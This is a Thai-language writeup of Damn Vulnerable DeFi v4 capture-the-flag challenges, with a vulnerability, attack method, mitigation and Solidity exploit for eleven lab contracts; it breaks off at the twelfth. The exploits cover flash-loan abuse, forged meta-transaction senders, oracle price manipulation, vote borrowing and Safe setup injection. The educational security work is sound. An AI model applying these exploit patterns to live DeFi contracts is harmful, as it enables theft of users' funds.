# Damn Vulnerable DeFi v4 Writeups
by tinamints

## 1. Unstoppable
vault ERC4626 ที่ให้กู้ flash loan ฟรีแต่โดน DoS ได้เพราะเช็ค balance แบบเข้มงวดเกินไป
### เป้าหมาย :
- หยุดการทำงานของ vault
### ช่องโหว่ :
- `flashLoan` เช็ค `convertToShares(totalSupply) == balanceBefore` ซึ่งตั้งสมมติฐานว่า balance ใน vault จะเพิ่มได้ผ่าน `deposit` (ที่ mint shares ให้) เท่านั้น แต่ถ้าโอนโทเคนเข้าไปตรง ๆ ด้วย `transfer` balance จะเพิ่มโดย shares ไม่ถูก mint เช็คนี้เลยไม่ผ่านและทำให้ `flashLoan` revert
### วิธีโจมตี :
- ใช้ `token.transfer` โอน DVT 1 wei เข้า vault ตรงๆ ทำให้เช็คไม่ผ่าน
### การป้องกัน :
- ในกรณีนี้ แค่ลบเช็ค `convertToShares(totalSupply) != balanceBefore` ที่ซ้ำซ้อนออกก็พอ เพราะไม่ได้เพิ่มความปลอดภัยอะไร (`ERC20(_token).safeTransferFrom(address(receiver), address(this), amount + fee);` คือตัวที่บังคับให้ต้องคืนเงินกู้)
### POC
```solidity
function test_unstoppable() public checkSolvedByPlayer {
    token.transfer(address(vault), 1);
}
```

## 2. Naive Receiver
pool flash loan WETH ที่คิดค่าธรรมเนียม 1 WETH และรองรับ meta-transaction แต่เปิดช่องให้ใครก็ได้สั่งกู้แทน receiver และปลอมตัวเป็นผู้ส่งได้
### เป้าหมาย :
- ดึง WETH ทั้งหมดจาก receiver (10 WETH) และ pool (1000 WETH) ไปไว้ที่ recovery
### ข้อจำกัด :
- ใช้ไม่เกิน 2 transactions
### ช่องโหว่ :
- ใครก็สามารถเรียก `flashLoan` โดยระบุ `receiver` เป็นใครก็ได้ และ receiver ก็ไม่เช็คว่าใครเป็นคนสั่งกู้ attacker เลยบังคับให้ receiver จ่ายค่าธรรมเนียม 1 WETH ซ้ำ ๆ ได้ โดยค่าธรรมเนียมทั้งหมดไปเข้า `feeReceiver` ของ pool (คือ deployer)
- `withdraw` ใช้ `_msgSender()` ซึ่งถ้าถูกเรียกมาจาก trusted forwarder จะเชื่อ 20 byte สุดท้ายของ calldata attacker เลยเรียกผ่าน forwarder + `multicall` แล้วต่อ address อะไรก็ได้ไว้ท้าย calldata เพื่อถอนเงินในนามของ deployer
### วิธีโจมตี :
- ยัด `flashLoan` จำนวน 0 ที่ชี้ไปที่ receiver 10 ครั้งไว้ใน `multicall` เดียว ทำให้ 10 WETH ของ receiver ถูกหักเป็นค่าธรรมเนียมไปเข้า deposit ของ deployer
- ถอนเงินทั้งหมดในนามของ deployer แล้วส่งไป recovery โดยส่ง request ผ่าน trusted forwarder และปลอม address ของ deployer ไว้ท้าย calldata ของ `withdraw`
### การป้องกัน :
- ต้องตรวจสอบว่าใครเป็นคนสั่งกู้จริง ๆ (ไม่ให้ receiver โดนเก็บค่าธรรมเนียมจากเงินกู้ที่ตัวเองไม่ได้ขอ) และไม่เชื่อ `_msgSender()` ที่มากับ forwarder ใน `withdraw`. ใช้ access control ที่รัดกุมและตรวจสอบ forwarder ที่ไว้ใจได้
### POC
```solidity
function test_naiveReceiver() public checkSolvedByPlayer {
    // บังคับให้ receiver จ่ายค่าธรรมเนียม 10 ครั้งจนหมดตัว
    bytes[] memory data = new bytes[](10);
    for (uint256 i = 0; i < 10; i++) {
        data[i] = abi.encodeWithSignature(
            "flashLoan(address,address,uint256,bytes)",
            address(receiver),
            address(weth),
            0,
            ""
        );
    }
    pool.multicall(data);

    // สร้าง withdraw call ปลอมโดยต่อ address ของ deployer ไว้เป็น from
    bytes memory withdrawCall = abi.encodeCall(
        pool.withdraw, (weth.balanceOf(address(pool)), payable(recovery))
    );
    bytes memory forgedCall = abi.encodePacked(withdrawCall, deployer);

    bytes[] memory calls = new bytes[](1);
    calls[0] = forgedCall;

    bytes memory multicallData = abi.encodeCall(pool.multicall, (calls));

    // เซ็น request ให้ forwarder
    BasicForwarder.Request memory request = BasicForwarder.Request({
        from: player,
        target: address(pool),
        value: 0,
        gas: 100_000,
        nonce: forwarder.nonces(player),
        data: multicallData,
        deadline: block.timestamp + 1 days
    });

    // _hashTypedData เป็น internal ใน forwarder เลยต้องสร้าง digest แบบ EIP-712 เอง
    bytes32 structHash = forwarder.getDataHash(request);
    bytes32 digest = keccak256(abi.encodePacked("\x19\x01", forwarder.domainSeparator(), structHash));
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
    bytes memory signature = abi.encodePacked(r, s, v);

    // execute request ของ forwarder ด้วย calldata ที่ปลอมไว้
    forwarder.execute(request, signature);
}
```

## 3. Truster
pool flash loan DVT ที่ยอมเรียกฟังก์ชันอะไรก็ได้แทนผู้กู้ ทำให้มีช่องโหว่ external call ที่ไม่ได้ตรวจสอบ
### เป้าหมาย :
- ดึง DVT ทั้งหมดจาก pool ไปไว้ที่ recovery
### ข้อจำกัด :
- ใช้แค่ 1 transaction
### ช่องโหว่ :
- `flashLoan(amount, borrower, target, data)` รัน `target.functionCall(data)` โดยมี pool เป็น `msg.sender` และกู้จำนวน 0 ได้ ดังนั้นใครก็สั่งให้ pool เรียกฟังก์ชันอะไรใน contract ไหนก็ได้
### วิธีโจมตี :
- กู้ 0 DVT โดยตั้ง `target = token` และ `data = approve(attacker, TOKENS_IN_POOL)` ให้ pool approve ให้ attacker เอง แล้ว `transferFrom` ทุกอย่างไป recovery ทั้งสองขั้นตอนทำใน attacker contract เดียว เลยนับเป็น 1 transaction
### การป้องกัน :
- ไม่ควรให้ pool เรียก `target.call(data)` อะไรก็ได้ ตัดส่วน call ที่ผู้ใช้กำหนดออก หรือทำ whitelist ของ target/selector เพื่อไม่ให้เรียก `approve` บน token ได้
### POC
```solidity
function test_truster() public checkSolvedByPlayer {
    Attacker attacker = new Attacker(pool, recovery, token, TOKENS_IN_POOL);
    attacker.attack();
}

contract Attacker {
    TrusterLenderPool private pool;
    address private recovery;
    DamnValuableToken private token;
    uint256 private TOKENS_IN_POOL;

    constructor(
        TrusterLenderPool _pool,
        address _recovery,
        DamnValuableToken _token,
        uint256 _TOKENS_IN_POOL
    ) {
        pool = _pool;
        recovery = _recovery;
        token = _token;
        TOKENS_IN_POOL = _TOKENS_IN_POOL;
    }

    function attack() external {
        // สร้าง calldata ของ token.approve(attacker, จำนวน token ทั้งหมด)
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            TOKENS_IN_POOL
        );
     
        // กู้ 0 แต่ให้ pool เรียก approve ให้ตัวเองใช้ token ของ pool ได้
        pool.flashLoan(0, address(this), address(token), data);

        // ดึง token ที่ได้รับ approve มาทั้งหมดไปที่ recovery
        token.transferFrom(address(pool), recovery, TOKENS_IN_POOL);
    }
}
```

## 4. Side Entrance
pool ETH ที่ฝาก ถอน และกู้ flash loan ฟรีได้ แต่มีช่องโหว่ที่ใช้การฝากเงินแทนการคืนเงินกู้ได้
### เป้าหมาย :
- ดึง ETH ทั้งหมดจาก pool ไปไว้ที่ recovery
### ช่องโหว่ :
- `flashLoan` เช็คแค่ว่า ETH balance ของ pool กลับมาเท่าเดิมหรือยัง โดยไม่สนว่า ETH กลับมาด้วยวิธีไหน พอเอา ETH ที่ยืมมา `deposit` กลับเข้าไปก็นับเป็นการคืนเงิน แถมยังเพิ่ม `balances` ของ attacker อีกด้วย
### วิธีโจมตี :
- กู้ ETH ทั้ง 1000 มา แล้วเอาไป `deposit` ใน `execute` ทันที เช็ค loan ผ่าน และ attacker มี balance 1000 ETH ทำให้มิสิทธิ์ `withdraw` แล้วส่ง ETH ไป recovery
### การป้องกัน :
- ไม่ให้การ `deposit` ระหว่างที่กู้อยู่นับเป็นการคืนเงิน และใส่ reentrancy guard ตัวเดียวคุมทั้ง `flashLoan` และ `deposit` หรือแยกการเช็คการคืนเงินออกจากเงินฝากของผู้ใช้
### POC
```solidity
function test_sideEntrance() public checkSolvedByPlayer {
    SideEntranceExploit exploit = new SideEntranceExploit(pool, recovery);
    exploit.exploit();
}

contract SideEntranceExploit  {
    SideEntranceLenderPool private pool;
    address private recovery;

    constructor(SideEntranceLenderPool _pool, address _recovery) {
        pool = _pool;
        recovery = _recovery;
    }

    function exploit() external {
        uint256 poolBalance = address(pool).balance;
        pool.flashLoan(poolBalance);


        pool.withdraw();
        payable(recovery).transfer(address(this).balance);
    }


    function execute() external payable {
        // ทำให้เช็คการคืนเงินผ่านและมี balance พอสำหรับเรียก withdraw() ทีหลัง
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}
```

## 5. The Rewarder
ตัวแจก reward DVT และ WETH ด้วย Merkle proof แต่มีช่องโหว่ที่ทำให้เคลม reward ซ้ำได้หลายรอบ

 *เฉลยจาก`https://github.com/RealJohnnyTime/damn-vulnerable-defi-v4-solutions/tree/master/test/the-rewarder`
### เป้าหมาย :
- ดึงเงินจาก distributor ไปไว้ที่ recovery ให้ได้มากที่สุด
### ข้อจำกัด :
- ผู้เล่นเป็น beneficiary จึงเคลมได้
### ช่องโหว่ :
- `claimRewards` รับ claim เป็น list แต่จะเช็คและตั้ง bit "เคลมแล้ว" ก็ต่อเมื่อ token เปลี่ยน หรือเมื่อถึง claim สุดท้ายเท่านั้น ดังนั้น claim ซ้ำของ token เดียวกันและ batch เดียวกันในการเรียกครั้งเดียวจึงไม่เคยถูกเช็คเลย
### วิธีโจมตี :
- สร้าง array ของ claim ที่ใส่ claim DVT ของผู้เล่น (พร้อม Merkle proof) ซ้ำหลายรอบจนดึง DVT ออกหมดแล้วทำแบบเดียวกันกับ WETH จากนั้นเรียก `claimRewards` ครั้งเดียว แล้วส่งทั้งหมดไป recovery
### การป้องกัน :
- ทำเครื่องหมายว่า claim ถูกใช้แล้ว (set claimed bit) ก่อนหรือระหว่างลูป และ reject claim ที่ (token, batch) ซ้ำ จะได้เคลม reward ซ้ำในการเรียกครั้งเดียวไม่ได้
### POC
```solidity
function test_theRewarder() public checkSolvedByPlayer {
        // อ่านไฟล์ JSON จ่าย DVT
        string memory dvtJson = vm.readFile(
            "test/the-rewarder/dvt-distribution.json"
        );
        Reward[] memory dvtRewards = abi.decode(
            vm.parseJson(dvtJson),
            (Reward[])
        );
        // JSON WETH
        string memory wethJson = vm.readFile(
            "test/the-rewarder/weth-distribution.json"
        );
        Reward[] memory wethRewards = abi.decode(
            vm.parseJson(wethJson),
            (Reward[])
        );
        // โหลด leaves 
        bytes32[] memory dvtLeaves = _loadRewards(
            "/test/the-rewarder/dvt-distribution.json"
        );
        bytes32[] memory wethLeaves = _loadRewards(
            "/test/the-rewarder/weth-distribution.json"
        );

        // หาจำนวน reward และ leaf ของผู้เล่น
        uint256 playerDvtAmount;
        bytes32[] memory playerDvtProof;
        uint256 playerWethAmount;
        bytes32[] memory playerWethProof;
        // สมมติว่า dvtRewards.length == wethRewards.length
        for (uint i = 0; i < dvtRewards.length; i++) {
            if (dvtRewards[i].beneficiary == player) {
                playerDvtAmount = dvtRewards[i].amount;
                playerWethAmount = wethRewards[i].amount;
                playerDvtProof = merkle.getProof(dvtLeaves, i);
                playerWethProof = merkle.getProof(wethLeaves, i);
                break;
            }
        }
        require(playerDvtAmount > 0, "Player not found in DVT distribution");
        require(playerWethAmount > 0, "Player not found in WETH distribution");

        // ตั้ง token ที่จะ claim
        IERC20[] memory tokensToClaim = new IERC20[](2);
        tokensToClaim[0] = IERC20(address(dvt));
        tokensToClaim[1] = IERC20(address(weth));

        // คำนวณจำนวนครั้งที่ต้อง claim จากยอดจ่ายทั้งหมดและจำนวนที่ผู้เล่นได้รับ
        uint256 totalClaimsNeeded = (TOTAL_DVT_DISTRIBUTION_AMOUNT /
            playerDvtAmount) +
            (TOTAL_WETH_DISTRIBUTION_AMOUNT / playerWethAmount);
        uint256 dvtClaims = TOTAL_DVT_DISTRIBUTION_AMOUNT / playerDvtAmount;
        Claim[] memory claims = new Claim[](totalClaimsNeeded);

        // สร้าง claim ทั้งหมด
        // ถ้า totalClaimsNeeded = 100 และ dvtClaims = 60 แล้ว wethClaims = 40
        // ลูปนี้ใช้ gas เกิน gas limit ของ Foundry ตอน test ต้องใส่ --gas-limit 9999999999999999 
        for (uint256 i = 0; i < totalClaimsNeeded; i++) {
            claims[i] = Claim({
                batchNumber: 0,
                amount: i < dvtClaims ? playerDvtAmount : playerWethAmount,
                tokenIndex: i < dvtClaims ? 0 : 1,
                proof: i < dvtClaims ? playerDvtProof : playerWethProof
            });
        }

        distributor.claimRewards({
            inputClaims: claims,
            inputTokens: tokensToClaim
        });

        dvt.transfer(recovery, dvt.balanceOf(player));
        weth.transfer(recovery, weth.balanceOf(player));
    }
```

## 6. Selfie
pool flash loan DVT ที่มีระบบ governance แบบโหวตด้วยโทเคน ที่มีช่องโหว่ยืมอำนาจโหวตผ่าน flash loan ได้
### เป้าหมาย :
- ดึง DVT ทั้งหมดจาก pool ไปไว้ที่ recovery
### ช่องโหว่ :
- governance ให้ใครก็ได้คิว action ถ้าถืออำนาจโหวตเกินครึ่งหนึ่ง ณ ตอนนั้น และ pool มี `emergencyExit` ที่ส่งเงินทั้งหมดไปที่ไหนก็ได้ (เรียกได้เฉพาะ governance) ส่วนอำนาจโหวตก็ยืมจาก pool เองได้
### วิธีโจมตี :
- กู้โทเคนทั้งหมดของ pool ด้วย flash loan จากนั้น delegate อำนาจโหวตให้ตัวเอง แล้วคิว `emergencyExit(recovery)` เป็น governance action จากนั้นคืนเงินกู้ รอ 2 วันด้วย `vm.warp` แล้วค่อย execute action
### การป้องกัน :
- คิดอำนาจโหวตจาก balance ที่ถือไว้ก่อนสร้าง proposal (แบบ checkpoint หรือถ่วงน้ำหนักตามเวลา) เพื่อไม่ให้ balance ที่ flash loan มาในบล็อกเดียวไปถึงเกณฑ์ได้
### POC
```solidity
function test_selfie() public checkSolvedByPlayer {
        Attacker attacker = new Attacker(pool, governance, token, recovery);
        attacker.attack();

        //warp ข้าม delay 2 วัน
        vm.warp(block.timestamp + 2 days);

        governance.executeAction(1);
    }

contract Attacker is IERC3156FlashBorrower {
    SelfiePool private pool;
    SimpleGovernance private governance;
    DamnValuableVotes private token;
    address private recovery;

    constructor(SelfiePool _pool, SimpleGovernance _governance, DamnValuableVotes _token, address _recovery) {
        pool = _pool;
        governance = _governance;
        token = _token;
        recovery = _recovery;
    }

    function attack() external {
        pool.flashLoan(this, address(token), token.balanceOf(address(pool)), "");
    }

    //pool เรียกฟังก์ชันนี้ระหว่าง flashLoan
    function onFlashLoan(address initiator, address _token, uint256 amount, uint256 fee, bytes calldata data)
        external
        override
        returns (bytes32)
    {
        //ได้อำนาจโหวตของ governance
        token.delegate(address(this));

        //คิว action เพื่อเรียก emergencyExit
        bytes memory emergencyExitData = abi.encodeWithSignature("emergencyExit(address)", recovery);
        governance.queueAction(address(pool), 0, emergencyExitData);

        // คืนเงินกู้ให้ pool
        token.approve(address(pool), amount);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
```

## 7. Compromised
exchange NFT ที่ตั้งราคาจาก median (ค่ากลาง) ของ oracle 3 แหล่ง แต่มีช่องโหว่เพราะ private key ของ oracle หลุด
### เป้าหมาย :
- ดึง ETH ทั้งหมดจาก exchange ไปไว้ที่ recovery
### ข้อจำกัด :
- ผู้เล่นต้องไม่เหลือ NFT ตอนจบ
- ราคา NFT ต้องกลับมาเท่าเดิมตอนจบ
### ช่องโหว่ :
- hex 2 ชุดที่หลุดมาใน README.md ของ challenge นี้ถอดรหัส (hex → base64 → ข้อความ) ได้เป็น private key ของ oracle 2 จาก 3 แหล่ง เนื่องจากราคาคือ median ของทั้ง 3 แหล่ง พอคุมได้ 2 แหล่งก็คุมราคาได้เลย
### วิธีโจมตี :
- ใช้ key ทั้งสองตั้งราคาเป็น 0, ซื้อ NFT 1 ชิ้นด้วย 1 wei แล้วตั้งราคากลับเป็น 999 ETH จากนั้นขาย NFT คืนได้ 999 ETH แล้วส่ง ETH ไป recovery
### การป้องกัน :
- เก็บ private key ของ oracle ให้ปลอดภัย และรวมราคาจากหลายแหล่งพร้อมเช็คความเบี่ยงเบน (เช่น Chainlink) ทำให้ถึงจะ key รั่วหรือโดนคุมไม่กี่แหล่งก็ไม่สามารถกำหนดราคาได้
### POC
```solidity
function test_compromised() public checkSolved {
        // ตั้งราคาเป็น 0 เพื่อซื้อถูกแล้วขายแพง
        // private key ของ oracle 2 ตัวที่หลุด
        address source1 = sources[0]; // 0x188Ea627E3531Db590e6f1D71ED83628d1933088
        address source2 = sources[1]; // 0xA417D473c40a4d42BAd35f147c21eEa7973539D8
        
        vm.startPrank(source1);
        oracle.postPrice("DVNFT", 0);
        vm.stopPrank();
        
        vm.startPrank(source2);
        oracle.postPrice("DVNFT", 0);
        vm.stopPrank();
        
        vm.startPrank(player);
        uint256 nftId = exchange.buyOne{value: 1 wei}();

        nft.approve(address(exchange), nftId);
        vm.stopPrank();

        vm.startPrank(source1);
        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
        vm.stopPrank();
        
        vm.startPrank(source2);
        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
        vm.stopPrank();

        vm.startPrank(player);
        exchange.sellOne(nftId);
        
        payable(recovery).transfer(EXCHANGE_INITIAL_ETH_BALANCE);
        vm.stopPrank();
    }
```

## 8. Puppet
lending pool DVT ที่ตีราคาหลักประกันจาก pool Uniswap V1 โดนปั่นราคา spot ของ oracle ได้
### เป้าหมาย :
- ดึง DVT ทั้งหมด 100k จาก lending pool ไปไว้ที่ recovery
### ข้อจำกัด :
- ใช้แค่ 1 transaction
### ช่องโหว่ :
- pool ต้องการหลักประกันเป็น ETH มูลค่า 2 เท่าของ DVT ที่ยืม โดยดูราคา spot ของ Uniswap V1 (ETH balance / DVT balance) ซึ่งคู่นี้มีแค่ 10 ETH / 10 DVT ทำให้แค่ swap ก้อนใหญ่ครั้งเดียวราคาก็ขยับมหาศาล
### วิธีโจมตี :
- เขียนโค้ดโจมตีทั้งหมดใน attacker contract เดียว โดยดึง DVT ของผู้เล่นมาด้วยการใช้ EIP-2612 `permit` (ลายเซ็นอนุมัติล่วงหน้า ไม่ต้องมี tx `approve` แยก) เทเข้า Uniswap V1 ให้ราคา DVT ดิ่ง แล้วยืม DVT 100k ด้วยหลักประกันที่เหลือนิดเดียว จากนั้นส่งไป recovery
### การป้องกัน :
- ดึงราคาจาก oracle ที่ปั่นยาก (TWAP / Chainlink) ไม่ใช่ราคา spot ณ ตอนนั้นจาก reserves ของ Uniswap V1
### POC
```solidity
function test_puppet() public checkSolvedByPlayer {
        PuppetPoolAttacker attacker = new PuppetPoolAttacker(
        address(token),
        address(lendingPool),
        address(uniswapV1Exchange),
        recovery
        );


        // เตรียม EIP-2612 permit
        uint256 deadline = block.timestamp + 1 days;
        uint256 value    = type(uint256).max;
        uint256 nonce    = token.nonces(player);

        bytes32 PERMIT_TYPEHASH = keccak256(
            "Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)"
        );

        bytes32 structHash = keccak256(
            abi.encode(
                PERMIT_TYPEHASH,
                player,
                address(attacker),
                value,
                nonce,
                deadline
            )
        );

        bytes32 digest = keccak256(
            abi.encodePacked(
                "\x19\x01",
                token.DOMAIN_SEPARATOR(),
                structHash
            )
        );

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPrivateKey, digest);

        // 1 tx 
        attacker.attack{ value: 25 ether }(player, deadline, v, r, s);
    }

    contract PuppetPoolAttacker {
    DamnValuableToken public immutable token;
    PuppetPool public immutable lendingPool;
    IUniswapV1Exchange public immutable uniswapV1Exchange;
    address public immutable recovery;

    constructor(
        address _token,
        address _lendingPool,
        address _uniswapV1Exchange,
        address _recovery
    ) {
        token = DamnValuableToken(_token);
        lendingPool = PuppetPool(_lendingPool);
        uniswapV1Exchange = IUniswapV1Exchange(_uniswapV1Exchange);
        recovery = _recovery;
    }

    function attack(
        address player,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external payable {

        token.permit(
            player,
            address(this),
            type(uint256).max,
            deadline,
            v,
            r,
            s
        );

        require(msg.value == 25 ether, "NO ETH RECEIVED");


        uint256 playerTokens = token.balanceOf(player);
        token.transferFrom(player, address(this), playerTokens);


        uint256 attackerTokens = token.balanceOf(address(this));
        token.approve(address(uniswapV1Exchange), attackerTokens);

        uniswapV1Exchange.tokenToEthTransferInput(
            attackerTokens,
            9,
            block.timestamp + 1,
            address(this)
        );


        uint256 poolTokens = token.balanceOf(address(lendingPool));

        lendingPool.borrow{ value: 20 ether }(
            poolTokens,
            recovery
        );
    }

    receive() external payable {}
}
```

## 9. Puppet V2
lending pool DVT ที่ตีราคาหลักประกัน WETH จาก reserves ของ Uniswap V2 จึงโดนปั่นราคา spot ของ oracle ได้
### เป้าหมาย :
- ดึง DVT 1M ทั้งหมดจาก lending pool ไปไว้ที่ recovery
### ช่องโหว่ :
- pool ต้องการหลักประกันเป็น WETH มูลค่า 3 เท่าของ DVT ที่ยืม โดยดูราคา spot จาก `getReserves` ของ Uniswap V2 ซึ่ง pair เล็กมาก (100 DVT / 10 WETH) สามารถ manipulate ราคาได้โดยการขาย DVT 10k ของผู้เล่น
### วิธีโจมตี :
- ขาย DVT ทั้งหมดเป็น ETH บน Uniswap V2 จากนั้น wrap ETH เป็น WETH แล้ว approve หลักประกันที่ตอนนี้เหลือนิดเดียวและยืม 1ล้าน DVT แล้วส่งไป recovery
### การป้องกัน :
- ใช้ TWAP หรือ oracle ภายนอกตีมูลค่าหลักประกัน แทนราคา spot จาก `getReserves` ของ Uniswap V2 เหมือน Puppet
### POC
```solidity
function test_puppetV2() public checkSolvedByPlayer {
    token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);

    address[] memory path = new address[](2);
    path[0] = address(token);
    path[1] = address(weth);

    uint256 tokensToSell = token.balanceOf(player);
    uniswapV2Router.swapExactTokensForETH(tokensToSell, 0, path, player, block.timestamp + 1);

    uint256 poolTokens = token.balanceOf(address(lendingPool));
    uint256 requiredWETH = lendingPool.calculateDepositOfWETHRequired(poolTokens);

    uint256 ethBalance = address(player).balance;
    require(ethBalance >= requiredWETH, "Not enough ETH after swap");
    weth.deposit{value: ethBalance}();
    weth.approve(address(lendingPool), requiredWETH);
    lendingPool.borrow(poolTokens);
    uint256 borrowedTokens = token.balanceOf(player);
    token.transfer(recovery, borrowedTokens);
}
```

## 10. Free Rider
marketplace NFT ที่ขาย NFT 6 ชิ้น ชิ้นละ 15 ETH แต่ logic การจ่ายเงินใน `buyMany` พัง
### เป้าหมาย :
- ดึง NFT ทั้ง 6 ชิ้นจาก marketplace ไปให้ recovery manager
- ผู้เล่นได้ bounty 45 ETH
### ช่องโหว่ :
- `buyMany` เช็ค `msg.value >= price` แค่หนึ่งชิ้น ทำให้จ่าย 15 ETH ครั้งเดียวก็ผ่านเช็คครบทั้ง 6 ชิ้น
- แถมยังโอน NFT ให้ผู้ซื้อก่อนจ่ายเงินให้เจ้าของ เงินที่ควรไปถึงผู้ขายเลยวนกลับมาที่ผู้ซื้อเอง
### วิธีโจมตี :
- flash swap 15 WETH จาก Uniswap V2, unwrap เป็น ETH, ซื้อ NFT ทั้ง 6 ชิ้นด้วย 15 ETH (แล้วได้เงินคืนมา 90 ETH), ส่ง NFT ให้ recovery manager เพื่อรับ bounty 45 ETH แล้วคืน flash swap พร้อมค่าธรรมเนียม
### การป้องกัน :
- คิดเงินเป็นผลรวมราคาของ NFT ทุกชิ้น (เช็คการจ่ายเงินทีละชิ้น) และจ่ายให้ผู้ขาย (เจ้าของก่อนโอน) ตามหลัก checks-effects-interactions
### POC
```solidity
 function test_freeRider() public checkSolvedByPlayer {
        flashLoanUser attacker = new flashLoanUser(
            address(marketplace),
            address(recoveryManager),
            address(nft),
            address(uniswapPair),
            address(token),
            address(weth),
            address(player)
        );
        //เรียก flashLoanInitilizer เพื่อกู้ flashloan 15 ETH (ใช้แค่ราคา NFT ชิ้นเดียวก็พอ)
        attacker.flashLoanInitilizer(15 ether);
    }

contract flashLoanUser is IUniswapV2Callee, IERC721Receiver {

FreeRiderNFTMarketplace public immutable marketplace;
FreeRiderRecoveryManager public immutable recoveryManager;
DamnValuableNFT public immutable nft;
IUniswapV2Pair public immutable pair;
address public immutable token;
address public immutable weth;
address public immutable player;

    constructor(
        address _marketplace,
        address _recoveryManager,
        address _nft,
        address _pair,
        address _token,
        address _weth,
        address _player
    ) {
        marketplace = FreeRiderNFTMarketplace(payable(_marketplace));
        recoveryManager = FreeRiderRecoveryManager(payable(_recoveryManager));
        nft = DamnValuableNFT(_nft);
        pair = IUniswapV2Pair(_pair);
        token = _token;
        weth = _weth;
        player = _player;
    }

    receive() external payable {}

    function flashLoanInitilizer(uint256 amount) external {
        //หาว่าต้องกู้ token ตัวไหนถึงผ่าน
        address token0 = pair.token0();
        address token1 = pair.token1();

        uint256 amount0Out = 0;
        uint256 amount1Out = 0;

        if (token0 == address(weth)) {
            amount0Out = amount;
        } else {
            amount1Out = amount;
        }

        //เรียก swap เพื่อเปิด flashloan
        pair.swap(amount0Out, amount1Out, address(this), abi.encode(amount));
    }

    //เรียกโดย pair contract
    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
        ) external override {
        //เช็คให้แน่ว่าเรียกมาจาก pair จริง
        require(msg.sender == address(pair), "Invalid caller");

        uint256 wethBorrowed = abi.decode(data, (uint256));

        //แปลง WETH เป็น ETH เพื่อซื้อ NFT
        WETH(payable(weth)).withdraw(wethBorrowed);

        uint256[] memory tokenIds = new uint256[](6);
        for (uint256 i = 0; i < 6; i++) {
            tokenIds[i] = i;
        }

        marketplace.buyMany{value: 15 ether}(tokenIds);

        for (uint256 i = 0; i < 6; i++) {
            nft.safeTransferFrom(address(this), address(recoveryManager), i, abi.encode(address(this)));
        }

        //แปลงกลับเป็น WETH เพื่อคืน flashloan
        uint256 ethBalance = address(this).balance;
        WETH(payable(weth)).deposit{value: ethBalance}();

        uint256 amountToRepay = ((wethBorrowed * 1000) / 997) + 1;

        IERC20(weth).transfer(address(pair), amountToRepay);

        uint256 remainingWETH = IERC20(weth).balanceOf(address(this));

        if (remainingWETH > 0) {
            WETH(payable(weth)).withdraw(remainingWETH);
            payable(player).transfer(address(this).balance); //ส่ง ETH ที่เหลือทั้งหมดให้ player
        }
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}
```

## 11. Backdoor
registry ที่จ่าย 10 DVT ให้ beneficiary (4 คน) ที่สร้าง Safe wallet แต่มีช่องโหว่ให้แทรกคำสั่งระหว่าง setup wallet
### เป้าหมาย :
- ดึง DVT 40 ทั้งหมดจาก registry ไปไว้ที่ recovery
### ข้อจำกัด :
- ใช้แค่ 1 transaction
### ช่องโหว่ :
- ใครก็สร้าง Safe ให้ beneficiary ผ่าน `createProxyWithCallback` ได้ และในการที่ registry จะจ่ายเงินให้ wallet ใหม่นั้น registry เช็ค owner กับ threshold แต่ไม่เช็ค `to`/`data` ใน `setup()` ของ Safe ทำให้ wallet ใหม่ delegatecall ไปที่ contract ไหนก็ได้
### วิธีโจมตี :
- สร้าง Safe ที่ `setup()` ไป delegatecall หา attacker ให้ wallet ของผู้ใช้ทั้ง 4 คน `approve` DVT ให้ attacker พอ registry ส่ง 10 DVT เข้า wallet attacker ก็ `transferFrom` ไป recovery ทันที ทั้งหมดรันใน constructor ของ attacker เดียว เลยเป็น 1 transaction
### การป้องกัน :
- ให้ registry ตรวจสอบ setup ของ wallet ใหม่ก่อนจ่ายเงิน (owner ต้องตรงกับที่คาดไว้, ไม่มี delegatecall/injected calls) แทนที่จะเชื่อ calldata `initializer` ที่ใครจะกำหนดเองก็ได้
### POC
```solidity
function test_backdoor() public checkSolvedByPlayer {
        new Attacker(
            address(walletFactory),
            address(singletonCopy),
            address(walletRegistry),
            address(token),
            recovery,
            users
        );
    }

    // Safe เรียกฟังก์ชันนี้
contract Initializer {
    function approveTokens(address token, address spender) external {
        IERC20(token).approve(spender, type(uint256).max);
    }
}

contract Attacker {
    constructor(
        address _walletFactory,
        address _singletonCopy,
        address _walletRegistry,
        address _token,
        address _recovery,
        address[] memory users
    ) {
        Initializer init = new Initializer();

        for (uint256 i = 0; i < users.length; i++) {
            address[] memory owners = new address[](1);
            owners[0] = users[i];

            // encode `approveTokens`
            bytes memory setupData = abi.encodeWithSelector(
                init.approveTokens.selector,
                _token,
                address(this)
            );

            // encode Safe.setup() โดยแทรกการเรียก approveTokens ของเราไว้ใน `to`/`data`
            bytes memory initData = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                owners,          // owners
                1,               // threshold
                address(init), // to: ถูกเรียกระหว่าง setup
                setupData,       // data: approve ให้ contract นี้ใช้ token ของ wallet ได้
                address(0),      // fallbackHandler
                address(0),      // paymentToken
                0,               // payment
                address(0)       // paymentReceiver
            );

            // deploy proxy: callback ของ WalletRegistry.proxyCreated() จะส่ง 10 DVT เข้า wallet
            address proxy = address(
                SafeProxyFactory(_walletFactory).createProxyWithCallback(
                    _singletonCopy,
                    initData,
                    i, // saltNonce: ไม่ซ้ำกันในแต่ละ user
                    IProxyCreationCallback(_walletRegistry)
                )
            );

            // ดึง 10 DVT ที่ registry ส่งเข้า wallet ไป วนครบ 4 ครั้ง = 40 DVT
            IERC20(_token).transferFrom(proxy, _recovery, IERC20(_token).balanceOf(proxy));
        }
    }
}
```

## 12. Climber
vault แบบ UUPS upgradeable ที่มี timelock เป็นเจ้าของ แต่ timelock รัน action ก่อนเช็คว่า schedule ไว้หรือยัง
### เป้าหมาย :
